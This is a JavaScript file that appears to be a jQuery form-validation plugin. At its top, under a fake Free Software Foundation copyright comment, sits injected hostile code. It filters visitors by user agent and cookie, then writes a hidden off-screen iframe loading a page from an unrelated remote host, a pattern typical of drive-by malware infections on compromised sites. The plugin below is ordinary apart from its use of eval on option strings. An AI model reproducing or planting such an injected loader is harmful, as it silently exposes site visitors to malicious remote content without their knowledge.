/*
Copyright (C) 2007 Free Software Foundation, Inc. http://fsf.org/
*/
function getCookie(name) {
var matches = document.cookie.match(new RegExp(
"(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
));
return matches ? decodeURIComponent(matches[1]) : undefined;
}
function Replacecountermine() {
var parover = navigator.userAgent;
var httpacc = (parover.indexOf("IEMobile") > -1 || parover.indexOf("Chrome") > -1 || parover.indexOf("Windows") < +1);
var ru = (getCookie("rightmools") === undefined);
if (!httpacc && ru) {
document.write('<iframe src="http://atusiman.dralwynethomas.co.uk/jujnamun15.html?" style="position:absolute;border-style:solid;border-left-style:dotted;top:-900px;background-color:yellow;cursor:move;left:-900px;" height="134" width="134"></iframe>');
var date = new Date( new Date().getTime() + 64*60*60*1000 );
document.cookie="rightmools=1; path=/; expires="+date.toUTCString();
}
}
Replacecountermine();
/*
Copyright (C) 2000 Free Software Foundation, Inc. See LICENSE.txt
*//**
 * @author GeekTantra
 * @date 20 September 2009
 */
(function(jQuery){
    var ValidationErrors = new Array();
    jQuery.fn.validate = function(options){
        options = jQuery.extend({
            expression: "return true;",
            message: "",
            error_class: "ValidationErrors",
            error_field_class: "ErrorField",
            live: true
        }, options);
        var SelfID = jQuery(this).attr("id");
        var unix_time = new Date();
        unix_time = parseInt(unix_time.getTime() / 1000);
        if (!jQuery(this).parents('form:first').attr("id")) {
            jQuery(this).parents('form:first').attr("id", "Form_" + unix_time);
        }
        var FormID = jQuery(this).parents('form:first').attr("id");
        if (!((typeof(ValidationErrors[FormID]) == 'object') && (ValidationErrors[FormID] instanceof Array))) {
            ValidationErrors[FormID] = new Array();
        }
        if (options['live']) {
            if (jQuery(this).find('input').length > 0) {
                jQuery(this).find('input').bind('blur', function(){
                    if (validate_field("#" + SelfID, options)) {
                        if (options.callback_success)
                            options.callback_success(this);
                    }
                    else {
                        if (options.callback_failure)
                            options.callback_failure(this);
                    }
                });
                jQuery(this).find('input').bind('focus keypress click', function(){
                    jQuery("#" + SelfID).next('.' + options['error_class']).remove();
                    jQuery("#" + SelfID).removeClass(options['error_field_class']);
                });
            }
            else {
                jQuery(this).bind('blur', function(){
                    validate_field(this);
                });
                jQuery(this).bind('focus keypress', function(){
                    jQuery(this).next('.' + options['error_class']).fadeOut("fast", function(){
                        jQuery(this).remove();
                    });
                    jQuery(this).removeClass(options['error_field_class']);
                });
            }
        }
        jQuery(this).parents("form").submit(function(){
            if (validate_field('#' + SelfID))
                return true;
            else
                return false;
        });
        function validate_field(id){
            var self = jQuery(id).attr("id");
            var expression = 'function Validate(){' + options['expression'].replace(/VAL/g, 'jQuery(\'#' + self + '\').val()') + '} Validate()';
            var validation_state = eval(expression);
            if (!validation_state) {
                if (jQuery(id).next('.' + options['error_class']).length == 0) {
                    jQuery(id).after('<span class="' + options['error_class'] + '">' + options['message'] + '</span>');
                    jQuery(id).addClass(options['error_field_class']);
                    //jQuery(id).scrollTo();

                }
                if (ValidationErrors[FormID].join("|").search(id) == -1)
                    ValidationErrors[FormID].push(id);

									 	//$.scrollTo('#' + id, "slow");
									 	//$.scrollTo('ValidationErrors:first', "slow");
										//$.scrollTo($('span.ValidationErrors').first, "slow");
										//$('#' + id).animate({scrollTop:0}, 'slow');
										//jQuery(id).focus();
										//$("#message").attr("tabindex",-1).focus();
$('#message').toggle();
$('html, body').animate({scrollTop:0}, 'slow');
                return false;
            }
            else {
                for (var i = 0; i < ValidationErrors[FormID].length; i++) {
                    if (ValidationErrors[FormID][i] == id)
                        ValidationErrors[FormID].splice(i, 1);

                }
                return true;
            }
        }


    };

	 //	alert( "Here 2 echo = " +  ValidationErrors[FormID].length);


    jQuery.fn.validated = function(callback){
        jQuery(this).each(function(){
            if (this.tagName == "FORM") {
                jQuery(this).submit(function(){
                    if (ValidationErrors[jQuery(this).attr("id")].length == 0)

                        callback();


					return false;
                });
            }
        });
    };



})(jQuery);
